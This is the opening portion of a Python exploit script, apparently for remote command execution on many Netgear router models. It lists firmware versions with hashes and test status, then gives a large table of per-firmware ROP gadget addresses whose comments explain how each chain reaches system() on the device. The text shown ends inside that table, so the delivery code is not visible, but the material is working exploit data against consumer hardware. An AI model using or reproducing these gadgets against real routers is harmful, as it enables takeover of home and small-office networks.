#   WNDR3400v2  V1.0.0.16_1.0.34      6e2f0190e121d60c8ff14a3fbe1f13f1  Tested
#   WNDR3400v2  V1.0.0.12_1.0.30      b5b34647f8f8d3ba34e7eb5d9c972135  Untested
#   WNDR3400v3  V1.0.1.24_1.0.67      2be19432190609d6bfb02d6c1c47ee75  Tested
#   WNDR3400v3  V1.0.1.22_1.0.66      c077e49ec59fc692b030198bf495e3ae  Untested
#   WNDR3400v3  V1.0.1.18_1.0.63      21bf9c98c100bda9f3c1426c0ac08b8e  Untested
#   WNDR3400v3  V1.0.1.16_1.0.62      c5df186763e4635396ae951b655dd071  Untested
#   WNDR3400v3  V1.0.1.14_1.0.61      7e3e4b4e1d52fbcd7d5e5843f09f0a68  Untested
#   WNDR3400v3  V1.0.1.12_1.0.58      41ce43703a3ebae82b57b67bb40c5d82  Untested
#   WNDR3400v3  V1.0.1.8_1.0.56       4f5b23803637f7217bd04af851956296  Untested
#   WNDR3400v3  V1.0.1.4_1.0.52       1ecf5ef5969f669596c25844eef9d493  Untested
#   WNDR3400v3  V1.0.1.2_1.0.51       d5e10eb60169468672f64b018b5de076  Untested
#   WNDR3400v3  V1.0.0.48_1.0.48      3a34943e3bb1ca6e1aba397b411f4b8e  Untested
#   WNDR3400v3  V1.0.0.46_1.0.45      eabecab2f26341257506074a68545c2b  Untested
#   WNDR3400v3  V1.0.0.38_1.0.40      72e5fd96a04f49a20be668bb0c5f0730  Tested
#   WNDR3400v3  V1.0.0.22_1.0.29      a04349703393acb4fa8ca8aea84fa623  Untested
#   WNDR3400v3  V1.0.0.20_1.0.28      469df29ef44a9df192be7f19d1480330  Untested
#   WNDR3700v3  V1.0.0.42_1.0.33      58e4777d185a193780db166db21d5a04  Tested
#   WNDR3700v3  V1.0.0.38_1.0.31      7ba5ac026b6f6682dac17a5ce954a96c  Tested
#   WNDR3700v3  V1.0.0.36_1.0.30      74ee38f55aedd22b1eab1dbf40b11386  Untested
#   WNDR3700v3  V1.0.0.30_1.0.27      82441ed888457dcdd73dec464ded0fdc  Untested
#   WNDR3700v3  V1.0.0.22_1.0.17      82c000f2875fcf4124ec520a49abb16b  Untested
#   WNDR3700v3  V1.0.0.18_1.0.14      11b537851e5429908b1d6ba720db2869  Tested
#   WNDR4000    V1.0.2.10_9.1.89      acecc4d245b1d3ac2a9863a26578f150  Tested
#   WNDR4000    V1.0.2.6_9.1.87       fe27305c1bcf41d76ed261aefb28c3bc  Untested
#   WNDR4000    V1.0.2.4_9.1.86       fd0b612d1d38adb9e06b34f71d32c02f  Tested
#   WNDR4000    V1.0.2.2_9.1.84       db0094ac915fdc03f939d8e322a90ab7  Untested
#   WNDR4000    V1.0.0.94_9.1.81      0f5429b29cd3e891e79674989aec023c  Untested
#   WNDR4000    V1.0.0.90_9.1.79      3fa15f5a61b941a2c0135af3e515c5e8  Untested
#   WNDR4000    V1.0.0.88_9.1.77      7abf69863995397c54b425ca80b30b53  Untested
#   WNDR4000    V1.0.0.82_8.0.71      5523a6ff5e7b9e09ce13390c55afe218  Tested
#   WNDR4000    V1.0.0.66_8.0.55      36a4947d7073786d72f455d757361db6  Untested
#   WNDR4500    V1.0.1.46_1.0.76      84574e9f9fe95c604448052edb4d8d87  Untested
#   WNDR4500    V1.0.1.40_1.0.68      dc85b49521a1c363c73bf1ebe8c73ba0  Untested
#   WNDR4500    V1.0.1.38_1.0.64      2c740bb2e8475e8265d03896eca8fc25  Untested
#   WNDR4500    V1.0.1.36_1.0.63      2c7bf148fd493ea4def07e6c1cc23303  Untested
#   WNDR4500    V1.0.1.20_1.0.40      5455b061ee711044c5486590cca00ff0  Untested
#   WNDR4500    V1.0.1.18_1.0.36      379ff2bad24e59f83198417a7bcd733c  Untested
#   WNDR4500    V1.0.1.6_1.0.24       30e3aa7b3fab44e518a336d74bfa453e  Untested
#   WNDR4500    V1.0.0.58_1.0.13      bdb781e3112fa9ffe30d16117ecd701d  Untested
#   WNDR4500    V1.0.0.50_1.0.12      0162e056eb5d34da63ff8e6d4d73f5a0  Untested
#   WNDR4500    V1.0.0.40_1.0.10      48a3028c2e06d22fee5161fba04b260d  Untested
#   WNDR4500v2  V1.0.0.72_1.0.45      c5f20d0f2cee57993508c0418392e0f3  Tested
#   WNDR4500v2  V1.0.0.68_1.0.42      af43fabb4e9ff2e2318d2a36417bd978  Untested
#   WNDR4500v2  V1.0.0.64_1.0.40      1d7bc84bb31f20ceaa573e36be1b0857  Untested
#   WNDR4500v2  V1.0.0.62_1.0.39      4134d640352f4d577f6185f4c0ebfb4a  Untested
#   WNDR4500v2  V1.0.0.60_1.0.38      d24a33895a62e79a4f78055520319e45  Tested
#   WNDR4500v2  V1.0.0.56_1.0.36      1220bf91d071f907ad2642b550268b9b  Untested
#   WNDR4500v2  V1.0.0.54_1.0.33      4b1967613a61bc6c2120069ba68a1d5b  Untested
#   WNDR4500v2  V1.0.0.50_1.0.30      15f6b8ea1aba81531f1c53f68519946f  Untested
#   WNDR4500v2  V1.0.0.42_1.0.25      544ccf81ef326f62455bdac3159cfc83  Untested
#   WNDR4500v2  V1.0.0.36_1.0.21      34ef5af300ef8a2c4528f29a5075610a  Untested
#   WNDR4500v2  V1.0.0.26_1.0.16      fb9ff113df712a183d6346c620ee87cd  Untested
#   WNR834Bv2   V2.1.13_2.1.13        2d6331f57ce223c595602c0a90926b0e  Untested
#   WNR834Bv2   V2.1.13_2.1.13NA      c42048a86d1f24036fc03d065381809e  Tested
#   WNR834Bv2   V2.0.8_2.0.8          6dc2d3a927cee46b2ef538d3ee6d54d9  Untested
#   WNR834Bv2   V2.0.8_2.0.8NA        f146e01301d76991b6fdc8230ad5fb15  Untested
#   WNR834Bv2   V1.0.32_1.0.32        2529e65416073a7ec0f414314517bcea  Untested
#   WNR834Bv2   V1.0.32_1.0.32NA      a7a8fc6ae466ec8cc90dda8253fba107  Untested
#   WNR1000v3   V1.0.2.72_60.0.96     d411870b5481c7cd0eb562910ef2c073  Untested
#   WNR1000v3   V1.0.2.72_60.0.96NA   295e02ba735bd0af037559d774b9a2db  Tested
#   WNR1000v3   V1.0.2.68_60.0.93     ff97e01e443cc81bb30f03fc0efe5308  Untested
#   WNR1000v3   V1.0.2.68_60.0.93NA   7ba59824dc432a51a535087b0d3ac81e  Untested
#   WNR1000v3   V1.0.2.62_60.0.87     29f0ec7ed9a0ce791646d81093d0c8e3  Untested
#   WNR1000v3   V1.0.2.62_60.0.87NA   245b31c66e707af407846dca4b9b7a8e  Untested
#   WNR1000v3   V1.0.2.60_60.0.86WW   fe9d4fb399ba44f717a2939cd17072ce  Untested
#   WNR1000v3   V1.0.2.60_60.0.86NA   9cfaf1947bc6d5745faee53495293ff7  Untested
#   WNR1000v3   V1.0.2.54_60.0.82     1e268e025b02efcc0bb06c2b4625628b  Untested
#   WNR1000v3   V1.0.2.54_60.0.82NA   6e10842a669a29f1bfdd76473123d690  Untested
#   WNR1000v3   V1.0.2.28_52.0.60     420a11918e1f453f021e230d73406fb6  Untested
#   WNR1000v3   V1.0.2.28_52.0.60NA   509a52eb9a78f1ff769b0f0c84ad2b9d  Untested
#   WNR1000v3   V1.0.2.26_51.0.59     8767f575ddfbd4665d7dd05e42faf079  Untested
#   WNR1000v3   V1.0.2.26_51.0.59NA   6692853b230f3af1b690671a27bd059f  Untested
#   WNR1000v3   V1.0.2.18_47.0.52     1e40904ed44bf26bbfeecbd2c0dec4fe  Untested
#   WNR1000v3   V1.0.2.18_47.0.52NA   f6dafa4be552fe2a5753281a2f80c5ec  Untested
#   WNR1000v3   V1.0.2.4_39.0.39      ef2240e32d1c7d76ca541c0d329d5a7d  Untested
#   WNR2000v2   V1.2.0.8_36.0.60      777527ae69d32f5cd0fda49d9987c176  Tested
#   WNR2000v2   V1.2.0.8_36.0.60NA    542ecd9c806cbbf4916e01bb89eeb5a8  Untested
#   WNR2000v2   V1.2.0.6_36.0.58      6d480f84ab1eda1f1ae3ed86a80e9b59  Untested
#   WNR2000v2   V1.2.0.6_36.0.58NA    6d480f84ab1eda1f1ae3ed86a80e9b59  Untested
#   WNR2000v2   V1.2.0.4_35.0.57      1e628de1f92428df23cd55dfd223c068  Untested
#   WNR2000v2   V1.2.0.4_35.0.57NA    6d1f447d9d84a86f9a08b46f506ff1d9  Tested
#   WNR2000v2   V1.0.0.40_32.0.54     043e419fd8c05607ec9e5b4482c95f13  Tested
#   WNR2000v2   V1.0.0.40_32.0.54NA   6b55ee8f255f57414338ee05282bdca9  Untested
#   WNR2000v2   V1.0.0.35_29.0.47     715eb802324b205e7f56a85d43665f7f  Untested
#   WNR2000v2   V1.0.0.34_29.0.45     51eaa4d099f0cdb46f633564f62f8497  Untested
#   WNR2000v2   V1.0.0.34_29.0.45NA   577a2e81d0dd7d34bee9c63819538f76  Untested
#   WNR3500     V1.0.36_8.0.36NA      d860aaf29860050a007e633b89664974  Tested
#   WNR3500     V1.0.30_8.0.30        1f848e4d7e6703048cf0181824fb609b  Untested
#   WNR3500     V1.0.29_8.0.29NA      3c1fdb2291946a0a926807695c12628c  Untested
#   WNR3500     V1.0.22_6.0.22        d8a129dfaea562433cf80be956300b2f  Untested
#   WNR3500     V1.0.22_6.0.22NA      45a17326c49ac43bcb6b18afb3c0b5f5  Untested
#   WNR3500     V1.0.15_1.0.15NA      e070997c460f44ab988a04a0efce13bb  Untested
#   WNR3500     V1.0.10_1.0.10NA      5977786564b864cbf4e42cdd797616ba  Untested
#   WNR3500v2   V1.2.2.28_25.0.85     e8693f52138f70fa9ada17e963a6afb4  Untested
#   WNR3500v2   V1.2.2.28_25.0.85NA   bf5336cceb49ac9bb9448e53147f869c  Untested
#   WNR3500v2   V1.0.2.14_24.0.74     6b443549f93556df02d9e1d9f93b3ce2  Untested
#   WNR3500v2   V1.0.2.14_24.0.74NA   386f51b17623cbc359fc3135baf40b0a  Untested
#   WNR3500v2   V1.0.2.10_23.0.70     46436291f6c3e3d27648d595fef53ae7  Untested
#   WNR3500v2   V1.0.2.10_23.0.70NA   3e5c2fc4a6466b601da6187868d93da1  Untested
#   WNR3500v2   V1.0.0.64_11.0.51     d0c84ea109ab5acd924a3e89adf530f0  Untested
#   WNR3500v2   V1.0.0.64_11.0.51NA   139e55982a1b17e078172bd4f9396abd  Untested
#   WNR3500L    V1.2.2.48_35.0.55NA   94a53de4ee1a4157072b96bedaec92af  Tested
#   WNR3500L    V1.2.2.44_35.0.53     c22b8c6b14d29a9e5610b1db5f516dfb  Untested
#   WNR3500L    V1.2.2.44_35.0.53NA   5e37f509dfa90a0d50532d5a8f58e0e7  Tested
#   WNR3500L    V1.2.2.40_34.0.48     e5ddafb1962c69c5fed3c7a107bb8f6f  Untested
#   WNR3500L    V1.2.2.40_34.0.48NA   72b02a418f587ff453cf4fd22aff9220  Untested
#   WNR3500L    V1.2.2.30_34.0.37     70d568a9b4a5a7691d2efc8197fdf7c5  Untested
#   WNR3500L    V1.2.2.30_34.0.37NA   5a6bd3069dc06833bf48eedd9394404e  Untested
#   WNR3500L    V1.0.2.50_31.1.25     e9931e6dc7e2bd65f8b62609c108439b  Tested
#   WNR3500L    V1.0.2.50_31.1.25NA   fe186aa9a4636ad1a5914337f6ca7abf  Untested
#   WNR3500L    V1.0.2.26_30.0.98     517b93770badf97ffec0b86bfda4f023  Untested
#   WNR3500L    V1.0.2.26_30.0.98NA   27f4a60eccc9d5a444b889abb8711870  Untested
#   WNR3500L    V1.0.0.88_13.0.76     0df99aa41a37b89bca3b987a89cc8d94  Untested
#   WNR3500L    V1.0.0.88_13.0.76NA   c56d6ec2595a35dc42fb069df34d2446  Untested
#   WNR3500L    V1.0.0.86_13.0.75     c3408d55c826743cf772599c54b0bf18  Untested
#   WNR3500L    V1.0.0.86_13.0.75NA   58f6b918e96bd9a55cfa18a3358690cd  Untested
#   WNR3500Lv2  V1.2.0.56_50.0.96     8ce62e097cc3d1872c7e8d7d08c63ce4  Tested
#   WNR3500Lv2  V1.2.0.54_50.0.94     b350794ce4fec6ccf730b811a676bf3d  Untested
#   WNR3500Lv2  V1.2.0.50_50.0.90     71de09faa64e5a4d6c78a476b57c8f77  Untested
#   WNR3500Lv2  V1.2.0.48_40.0.88     78d236e8d0f23db2e2c9645bdfd308ee  Untested
#   WNR3500Lv2  V1.2.0.46_40.0.86     603d5ce196612709fcd8122b8a09cdaa  Untested
#   WNR3500Lv2  V1.2.0.44_40.0.84     c745ed78281129c513d5d96471c2f250  Untested
#   WNR3500Lv2  V1.2.0.40_40.0.80     d6de6022ff9381fb354c68008858c5ab  Untested
#   WNR3500Lv2  V1.2.0.38_40.0.78     902b6264511eb4067c8f37c3d2405d38  Untested
#   WNR3500Lv2  V1.2.0.34_40.0.75     e5b431877b953c9d5699003af3f5dc8d  Untested
#   WNR3500Lv2  V1.2.0.32_40.0.74     5d8f4bd2d847ec1f6274546dea54ce02  Untested
#   WNR3500Lv2  V1.2.0.28_40.0.72     582fb44d1d46856fdd7168ad4e37514a  Untested
#   WNR3500Lv2  V1.2.0.26_40.0.71     adbd30a2e76dfb0676f21ff7afcbb76e  Untested
#   WNR3500Lv2  V1.2.0.20_40.0.68     05f2658e63f0f8e7b32e1c8d945f6834  Untested
#   WNR3500Lv2  V1.2.0.18_40.0.67     3a35d7237573c8e21c048dfcc0715039  Untested
#   WNR3500Lv2  V1.2.0.16_40.0.66     6b65c8d0cba353d655abc311caa28741  Untested
#   WNR3500Lv2  V1.0.0.14_37.0.50     29dba756cc53cbaab1ec11c3a509f0a2  Untested
#   WNR3500Lv2  V1.0.0.10             af2d51ddebe58e58aad5309b63eb6c45  Untested
#   XR300       V1.0.3.38_10.3.30     e0b2fc5b04cd98e794df05ebac65e596  Untested
#   XR300       V1.0.3.34_10.3.27     7e20864385587876e149b9b745568f39  Untested
#   XR300       V1.0.3.26_10.3.22     69f1ce725f125e266a27c9419cdb82cc  Untested
#   XR300       V1.0.2.24_10.3.21     ab533f222aa912f02550ffb59379b728  Untested
#   XR300       V1.0.2.18_10.3.15     df58b36f5047a5e6092b91851b46d235  Untested
#   XR300       V1.0.1.4_10.1.4       c15de8b9c78405d565b29c5a2a01eda1  Untested
#
import SimpleHTTPServer
import SocketServer
import argparse
import collections
import os
import shutil
import socket
import struct
import sys
import time

###########################################################################
## Version Info ###########################################################
###########################################################################

# Gadget addresses used in the exploit.
address_info = {
	"AC1450" : {
		# 0) gadget: calls system($sp)
		"1.0.0.36" : 0x2958c,
		"1.0.0.34" : 0x28bd8,
		"1.0.0.22" : 0x27cc4,
		"1.0.0.14" : 0x27cc4,
		"1.0.0.8"  : 0x27ca4,
		"1.0.0.6"  : 0x27ca4,
	},
	"D6220" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.52" : 0x417CF8,
		"1.0.0.48" : 0x417CF8,
		"1.0.0.46" : 0x417CF8,
		"1.0.0.44" : 0x4179B8,
		"1.0.0.40" : 0x4179B8,
		"1.0.0.36" : 0x417864,
		"1.0.0.34" : 0x417864,
		"1.0.0.32" : 0x4178D4,
		"1.0.0.28" : 0x417804,
		"1.0.0.24" : 0x41736C,
		"1.0.0.22" : 0x416F54,
		"1.0.0.16" : 0x416034,
	},
	"D6300" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.102" : [0x44232C, 0x412D40],
		"1.0.0.96"  : [0x441CFC, 0x412BA8],
		"1.0.0.90"  : [0x441CFC, 0x412BA8],
		"1.0.0.88"  : [0x441D2C, 0x412BA8],
		"1.0.0.76"  : [0x4418BC, 0x412A88],
		"1.0.0.72"  : [0x440C8C, 0x412748],
		"1.0.0.42"  : [0x438224, 0x411CB4],
		"1.0.0.30"  : [0x438224, 0x411CB4],
		"1.0.0.24"  : [0x437FC4, 0x411C34],
		"1.0.0.16"  : [0x438024, 0x411BA8],
	},
	"D6400" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.88" : 0x417CA8,
		"1.0.0.86" : 0x417CA8,
		"1.0.0.82" : 0x417CA8,
		"1.0.0.80" : 0x417CA8,
		"1.0.0.78" : 0x417968,
		"1.0.0.74" : 0x417968,
		"1.0.0.70" : 0x417814,
		"1.0.0.68" : 0x417814,
		"1.0.0.66" : 0x4177B4,
		"1.0.0.60" : 0x4176E4,
		"1.0.0.58" : 0x4172FC,
		"1.0.0.56" : 0x416EF4,
		"1.0.0.54" : 0x416764,
		"1.0.0.52" : 0x4160C4,
		"1.0.0.44" : 0x415FC4,
		"1.0.0.38" : 0x434B28,
		"1.0.0.34" : 0x433FD8,
		"1.0.0.22" : 0x432098,
	},
	"D7000V2" : {
		# 0) gadget: calls system($sp+0x18)
		"1.0.0.56" : 0x41667C,
		"1.0.0.53" : 0x41667C,
		"1.0.0.52" : 0x41667C,
		"1.0.0.51" : 0x41667C,
		"1.0.0.47" : 0x41631C,
		"1.0.0.45" : 0x41627C,
		"1.0.0.44" : 0x41627C,
		"1.0.0.40" : 0x41619C,
		"1.0.0.38" : 0x415D4C,
	},
	"D8500" : {
		# 0) gadget: calls system($sp)
		"1.0.3.44" : 0x3b3f8,
		"1.0.3.43" : 0x3afd0,
		"1.0.3.42" : 0x3afd0,
		"1.0.3.39" : 0x3ac0c,
		"1.0.3.36" : 0x3a9c8,
		"1.0.3.35" : 0x3a994,
		"1.0.3.28" : 0x3a500,
		"1.0.3.27" : 0x3a254,
		"1.0.3.25" : 0x39d88,
	},
	"DC112A" : {
		# 0) gadget: calls system($sp)
		"1.0.0.44" : 0x2e3cc,
		"1.0.0.30" : 0x2d0e0,
		"1.0.0.24" : 0x2d224, 
	},
	"DGN2200" : {
		# 0) set $a0 to $sp+0x1B9 then jumps to $s1
		# 1) calls system without setting $a0
		"1.0.0.58"   : [0x44DD40, 0x44BCEC],
		"1.0.0.57"   : [0x44D3A0, 0x44B360],
		"1.0.0.55"   : [0x44D300, 0x44B2C0],
		"1.0.0.52"   : [0x44BEF0, 0x449EB0],
		"1.0.0.50NA" : [0x44BA54, 0x449A14],
		"1.0.0.36"   : [0x449438, 0x447490],
		"1.0.0.36NA" : [0x44908C, 0x4470E4],
	},
	"DGN2200V4" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.110" : [0x4336D4, 0x407370],
		"1.0.0.108" : [0x4331C4, 0x407370],
		"1.0.0.102" : [0x432F64, 0x407370],
		"1.0.0.98"  : [0x432CF4, 0x4072A0],
		"1.0.0.90"  : [0x432BA4, 0x407280],
		"1.0.0.86"  : [0x4328A4, 0x407280],
		"1.0.0.82"  : [0x431E44, 0x407220],
		"1.0.0.76"  : [0x431954, 0x4071E0],
		"1.0.0.66"  : [0x431104, 0x41232C],
		"1.0.0.62"  : [0x431104, 0x41232C],
		"1.0.0.58"  : [0x431104, 0x41232C],
		"1.0.0.46"  : [0x431104, 0x41232C],
		"1.0.0.24"  : [0x42BAE0, 0x412278],
		"1.0.0.5"   : [0x42B150, 0x411D5C],
	},
	"DGN2200M" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.37"   : [0x486B70, 0x411F88],
		"1.0.0.35"   : [0x484560, 0x411EE8],
		"1.0.0.35NA" : [0x483F90, 0x411F08],
		"1.0.0.33"   : [0x483D90, 0x411F34],
		"1.0.0.33NA" : [0x483780, 0x411F54],
		"1.0.0.26"   : [0x474B60, 0x410520],
		"1.0.0.24NA" : [0x474350, 0x4104D8],
	},
	"DGND3700" : {
		# 0) gadget: set $t9 to system (by calling system(NULL) when $s0 is 0)
		# 1) gadget: set $a0 to $sp+0x19 and calls $t9
		"1.0.0.17"   : [0x484EF4, 0x4107DC],
		"1.0.0.17NA" : [0x4848F4, 0x4107DC],
		"1.0.0.12"   : [0x484914, 0x4107BC],
		"1.0.0.12NA" : [0x484314, 0x4107BC],
	},
	"EX3700" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.78" : [0x61fdf0+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.76" : [0x61f1c0+0x724, 0x40b6b8, 0x41d3a4],
		"1.0.0.72" : [0x61df20+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.70" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.68" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.64" : [0x61e020+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.62" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.58" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.50" : [0x61dcc0+0x72c, 0x40b544, 0x41c618],
		"1.0.0.48" : [0x61ecb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.46" : [0x61df10+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.44" : [0x61de40+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.34" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.28" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.26" : [0x61d610+0x72c, 0x40b61c, 0x41e9dc],
		"1.0.0.24" : [0x61d580+0x72c, 0x40b61c, 0x41e9dc],
		"1.0.0.22" : [0x61d440+0x72c, 0x40b61c, 0x41e9dc],
	},
	"EX3800" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.78" : [0x61fdf0+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.76" : [0x61f1c0+0x724, 0x40b6b8, 0x41d3a4],
		"1.0.0.72" : [0x61df20+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.70" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.68" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.64" : [0x61e020+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.62" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.58" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.50" : [0x61dcc0+0x72c, 0x40b544, 0x41c618],
		"1.0.0.48" : [0x61ecb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.46" : [0x61df10+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.44" : [0x61de40+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.34" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.28" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.26" : [0x61d610+0x72c, 0x40b61c, 0x41e9dc],
	},
	"EX3920" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.78" : [0x61fdf0+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.76" : [0x61f1c0+0x724, 0x40b6b8, 0x41d3a4],
		"1.0.0.72" : [0x61df20+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.70" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.68" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.64" : [0x61e020+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.62" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.58" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.50" : [0x61dcc0+0x72c, 0x40b544, 0x41c618],
		"1.0.0.48" : [0x61ecb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.46" : [0x61df10+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.44" : [0x61de40+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.34" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.28" : [0x61ddb0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.26" : [0x61d610+0x72c, 0x40b61c, 0x41e9dc],
	},
	"EX6000" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.38" : [0x61fd80+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.32" : [0x61deb0+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.30" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.28" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.24" : [0x61dfb0+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.20" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.10" : [0x61e000+0x730, 0x40b684, 0x41ea4c],
	},
	"EX6100" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.2.24" : [0x61e590+0x72c, 0x40b5b4, 0x41d0f4],
		"1.0.2.18" : [0x6235e0+0x740, 0x40b6a4, 0x41c778],
		"1.0.2.16" : [0x6235e0+0x740, 0x40b6a4, 0x41c778],
		"1.0.2.6"  : [0x6235e0+0x740, 0x40b6a4, 0x41c7a8],
		"1.0.1.36" : [0x6225e0+0x740, 0x40b684, 0x41c588],
		"1.0.0.28" : [0x5df540+0x700, 0x40aef8, 0x41ffa4],
		"1.0.0.22" : [0x5de4f0+0x700, 0x40aedc, 0x41ff60],
	},
	"EX6120" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.48" : [0x61fdf0+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.46" : [0x61f1d0+0x724, 0x40b6b8, 0x41d3a4],
		"1.0.0.42" : [0x61df20+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.40" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.36" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.32" : [0x61e020+0x72c, 0x40b544, 0x41c7c8],
		"1.0.0.30" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.28" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.26" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
		"1.0.0.16" : [0x61e4b0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.14" : [0x61dfc0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.8"  : [0x61dfc0+0x730, 0x40b684, 0x41ea4c],
		"1.0.0.4"  : [0x61df60+0x730, 0x40b684, 0x41ea4c],
	},
	"EX6130" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _init_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x21, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.30" : [0x61fdf0+0x724, 0x40b680, 0x41d3c4],
		"1.0.0.28" : [0x61f1d0+0x724, 0x40b6b8, 0x41d3a4],
		"1.0.0.24" : [0x61df20+0x73c, 0x40b8b0, 0x41e064],
		"1.0.0.22" : [0x61dcd0+0x740, 0x40b874, 0x41e024],
		"1.0.0.20" : [0x621d20+0x734, 0x40b650, 0x41c8d8],
		"1.0.0.16" : [0x61dd20+0x72c, 0x40b544, 0x41c5e8],
		"1.0.0.12" : [0x61dd20+0x72c, 0x40b544, 0x41c618],
	},
	"EX6150" : {
		# 0) The $gp value so that a 'lw $t9, memset' will actually load system's address
		# 1) gadget: lw $gp,0x10($sp); lw $ra,0x1c($sp);
		#   - The end of the _term_proc function
		# 2) gadget: set $fp to $sp, set $a0 to $sp+0x25, and calls memset
		#   - The beginning of the build_asp_handler_table function
		"1.0.0.42" : [0x56ab80+0x2e8, 0x522b40, 0x417748],
		"1.0.0.34" : [0x570f00+0x208, 0x522ff0, 0x416b50],
		"1.0.0.32" : [0x570d30+0x208, 0x522ff0, 0x416b50],
		"1.0.0.28" : [0x570d20+0x208, 0x522ff0, 0x416b50],
		"1.0.0.16" : [0x570b90+0x208, 0x522e00, 0x416b50],
		"1.0.0.14" : [0x570b00+0x204, 0x522e20, 0x418828],
	},
	"EX6200" : {
		# 0) gadget: calls system($sp)
		"1.0.3.90" : 0x226f8,
		"1.0.3.88" : 0x226f8,
		"1.0.3.82" : 0x223fc,
		"1.0.3.76" : 0x220d0,
		"1.0.3.74" : 0x220b0,
		"1.0.3.68" : 0x21f50,
		"1.0.1.60" : 0x21260,
		"1.0.0.52" : 0x20e2c,
		"1.0.0.46" : 0x20e2c,
